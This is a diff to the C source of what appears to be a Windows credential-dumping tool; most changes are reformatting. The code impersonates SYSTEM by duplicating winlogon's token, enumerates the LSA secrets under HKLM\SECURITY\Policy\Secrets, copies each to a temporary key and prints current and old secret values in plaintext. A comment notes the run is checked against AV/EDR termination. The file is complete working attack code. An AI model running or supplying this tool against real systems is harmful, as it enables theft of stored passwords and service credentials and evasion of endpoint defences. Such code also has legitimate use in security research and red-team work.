@@ -14,16 +14,14 @@
 #define MAX_KEY_LENGTH 255
 
 
-NTSTATUS
-LsaOpenSecret(
+NTSTATUS LsaOpenSecret(
 	__in LSA_HANDLE PolicyHandle,
 	__in PUNICODE_STRING SecretName,
 	__in ACCESS_MASK DesiredAccess,
 	__out PLSA_HANDLE SecretHandle
 );
 
-NTSTATUS
-LsaQuerySecret(
+NTSTATUS LsaQuerySecret(
 	__in LSA_HANDLE SecretHandle,
 	__out_opt PUNICODE_STRING* CurrentValue,
 	__out_opt PLARGE_INTEGER CurrentValueSetTime,
@@ -44,7 +42,7 @@ BOOL reg_hklmkey_copy(LPCTSTR srcKey, LPCTSTR dstKey)
 		Status = RegCreateKey(HKEY_LOCAL_MACHINE, dstKey, &hkDst);
 		if (STATUS_SUCCESS == Status)
 		{
-			Status = SHCopyKey(hkSrc, NULL, hkDst, 0);
+			Status  = SHCopyKey(hkSrc, NULL, hkDst, 0);
 			bResult = (STATUS_SUCCESS == Status);
 			RegCloseKey(hkDst);
 		}
@@ -55,16 +53,12 @@ BOOL reg_hklmkey_copy(LPCTSTR srcKey, LPCTSTR dstKey)
 
 
 // no length checking. No real reason to expect input longer than USHORT/2.
-VOID
-InitUnicodeString(
-	PUNICODE_STRING DestinationString,
-	PWSTR SourceString
-)
+VOID InitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString)
 {
 	USHORT length;
-	DestinationString->Buffer = SourceString;
-	length = (USHORT)wcslen(SourceString) * sizeof(WCHAR);
-	DestinationString->Length = length;
+	DestinationString->Buffer        = SourceString;
+	length                           = (USHORT)wcslen(SourceString) * sizeof(WCHAR);
+	DestinationString->Length        = length;
 	DestinationString->MaximumLength = (USHORT)(length + sizeof(UNICODE_NULL));
 }
 
@@ -73,7 +67,7 @@ void read_secret(TCHAR* szSecretName)
 {
 	LSA_UNICODE_STRING Secret;
 	PLSA_UNICODE_STRING puCurrVal = NULL;
-	PLSA_UNICODE_STRING puOldVal = NULL;
+	PLSA_UNICODE_STRING puOldVal  = NULL;
 	NTSTATUS Status;
 	LSA_HANDLE lsahLocalPolicy;
 	LSA_HANDLE lsahSecretHandle;
@@ -93,32 +87,45 @@ void read_secret(TCHAR* szSecretName)
 		return;
 	}
 
-	Status = LsaOpenSecret(lsahLocalPolicy,
-		&Secret,
-		SECRET_QUERY_VALUE,
-		&lsahSecretHandle);
+	Status = LsaOpenSecret(lsahLocalPolicy, &Secret, SECRET_QUERY_VALUE, &lsahSecretHandle);
 	if (STATUS_SUCCESS != Status)
 	{
 		_tprintf(_T("LsaOpenSecret() - status: %ld\r\n"), Status);
 		return;
 	}
 
-	Status = LsaQuerySecret(lsahSecretHandle,
-		&puCurrVal,
-		&liCupdTime,
-		&puOldVal,
-		&liOupdTime);
+	Status = LsaQuerySecret(lsahSecretHandle, &puCurrVal, &liCupdTime, &puOldVal, &liOupdTime);
 	if (STATUS_SUCCESS != Status)
 	{
 		_tprintf(_T("LsaQuerySecret() - status: %ld\r\n"), Status);
 		return;
 	}
-	_tprintf(_T("Current secret: %s\r\n"), puCurrVal->Buffer);
-	FileTimeToSystemTime(&liCupdTime, &systemtime);
-	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
-	_tprintf(_T("    Old secret: %s\r\n"), puOldVal->Buffer);
-	FileTimeToSystemTime(&liOupdTime, &systemtime);
-	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
+
+	_tprintf(_T("Current secret: "));
+	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), puCurrVal->Buffer, puCurrVal->Length / sizeof(WCHAR), NULL, NULL);
+	_tprintf(_T("\r\n"));
+
+	FileTimeToSystemTime((LPFILETIME)&liCupdTime, &systemtime);
+	_tprintf(
+		_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"),
+		systemtime.wYear,
+		systemtime.wMonth,
+		systemtime.wDay,
+		systemtime.wHour,
+		systemtime.wMinute);
+
+	_tprintf(_T("    Old secret: "));
+	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), puOldVal->Buffer, puOldVal->Length / sizeof(WCHAR), NULL, NULL);
+	_tprintf(_T("\r\n"));
+
+	FileTimeToSystemTime((LPFILETIME)&liOupdTime, &systemtime);
+	_tprintf(
+		_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"),
+		systemtime.wYear,
+		systemtime.wMonth,
+		systemtime.wDay,
+		systemtime.wHour,
+		systemtime.wMinute);
 	LsaClose(lsahSecretHandle);
 	LsaClose(lsahLocalPolicy);
 }
@@ -126,7 +133,6 @@ void read_secret(TCHAR* szSecretName)
 
 BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
 {
-
 	TOKEN_PRIVILEGES tp;
 	LUID luid;
 
@@ -136,8 +142,8 @@ BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
 		return FALSE;
 	}
 
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
+	tp.PrivilegeCount           = 1;
+	tp.Privileges[0].Luid       = luid;
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
 	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
@@ -155,10 +161,10 @@ BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
 }
 
 
-DWORD getWinLogonPID()
+DWORD getWinLogonPID(void)
 {
 	PROCESSENTRY32W entry;
-	entry.dwSize = sizeof(PROCESSENTRY32W);
+	entry.dwSize    = sizeof(PROCESSENTRY32W);
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (TRUE == Process32FirstW(snapshot, &entry))
 	{
@@ -175,7 +181,7 @@ DWORD getWinLogonPID()
 }
 
 
-BOOL elevateSystem()
+BOOL elevateSystem(void)
 {
 	HANDLE currentTokenHandle = NULL;
 	BOOL getCurrentToken;
@@ -191,7 +197,7 @@ BOOL elevateSystem()
 		return FALSE;
 	}
 	HANDLE processHandle;
-	HANDLE tokenHandle = NULL;
+	HANDLE tokenHandle          = NULL;
 	HANDLE duplicateTokenHandle = NULL;
 	DWORD pidToImpersonate;
 	pidToImpersonate = getWinLogonPID();
@@ -213,7 +219,7 @@ BOOL elevateSystem()
 		return FALSE;
 	}
 	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
-	TOKEN_TYPE tk = TokenPrimary;
+	TOKEN_TYPE tk                      = TokenPrimary;
 	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
 	{
 		_tprintf(_T("DuplicateTokenEx Error %u\n"), GetLastError());
@@ -237,16 +243,16 @@ BOOL elevateSystem()
 
 
 TCHAR* pszSecretsSubkeyPath = _T("SECURITY\\Policy\\Secrets");
-TCHAR* pszTestKeyPath = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
-TCHAR* pszTestKeyName = _T("__GT__Decrypt");
+TCHAR* pszTestKeyPath       = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
+TCHAR* pszTestKeyName       = _T("__GT__Decrypt");
 
 
 int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 {
 	HKEY hTestKey;
 	TCHAR* pszTestedSecretFullKeyPath;
-	DWORD dwKeyNameSize; // size of name string 
-	DWORD dwSubKeyCount = 0; // number of subkeys 
+	DWORD dwKeyNameSize;      // size of name string 
+	DWORD dwSubKeyCount = 0;  // number of subkeys 
 	FILETIME ftLastWriteTime; // last write time 
 	LSTATUS Status;
 	SYSTEMTIME systemtime;
@@ -257,15 +263,13 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 		return -1;
 	}
 
-	Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
-		pszSecretsSubkeyPath,
-		0,
-		KEY_READ,
-		&hTestKey);
+	Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pszSecretsSubkeyPath, 0, KEY_READ, &hTestKey);
 
 	if (ERROR_SUCCESS != Status)
 	{
-		_tprintf(_T("\r\nCannot open HKLM\\%s.\r\nTrying to impersonate as NT AUTHORITY\\SYSTEM...\r\n"), pszSecretsSubkeyPath);
+		_tprintf(
+			_T("\r\nCannot open HKLM\\%s.\r\nTrying to impersonate as NT AUTHORITY\\SYSTEM...\r\n"),
+			pszSecretsSubkeyPath);
 		if (!elevateSystem())
 		{
 			_tprintf(_T("\r\nCannot elevate. Try to re-launch the tool as Admin or NT AUTHORITY\\SYSTEM\r\n"));
@@ -273,11 +277,7 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 		}
 
 		//should be elevated here, let's open again
-		Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
-			pszSecretsSubkeyPath,
-			0,
-			KEY_READ,
-			&hTestKey);
+		Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pszSecretsSubkeyPath, 0, KEY_READ, &hTestKey);
 
 		if (ERROR_SUCCESS != Status)
 		{
@@ -288,7 +288,7 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 
 
 	DWORD retCode;
-	// Get the value count. 
+	// Get the value count.
 	retCode = RegQueryInfoKey(
 		hTestKey,
 		NULL,
@@ -316,13 +316,7 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 	{
 		TCHAR szKey[MAX_KEY_LENGTH];
 		dwKeyNameSize = MAX_KEY_LENGTH;
-		retCode = RegEnumKeyEx(hTestKey, i,
-			szKey,
-			&dwKeyNameSize,
-			NULL,
-			NULL,
-			NULL,
-			&ftLastWriteTime);
+		retCode       = RegEnumKeyEx(hTestKey, i, szKey, &dwKeyNameSize, NULL, NULL, NULL, &ftLastWriteTime);
 		if (retCode == ERROR_SUCCESS)
 		{
 			_tprintf(TEXT("(%d) %s\n"), i + 1, szKey);
@@ -333,7 +327,13 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 
 			_tprintf(_T("--> %s\r\n"), pszTestedSecretFullKeyPath);
 			FileTimeToSystemTime(&ftLastWriteTime, &systemtime);
-			_tprintf(_T("Last Write Time: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
+			_tprintf(
+				_T("Last Write Time: %i-%02i-%02i %02i:%02i \r\n"),
+				systemtime.wYear,
+				systemtime.wMonth,
+				systemtime.wDay,
+				systemtime.wHour,
+				systemtime.wMinute);
 
 			if (reg_hklmkey_copy(pszTestedSecretFullKeyPath, pszTestKeyPath))
 			{
@@ -356,5 +356,7 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 	RegCloseKey(hTestKey);
 	LocalFree(pszTestedSecretFullKeyPath);
 	RevertToSelf();
+	_tprintf(_T("\r\nDone.\r\n")); //to show we reached the end without being terminated by an AV/EDR.
+
 	return 0;
 }
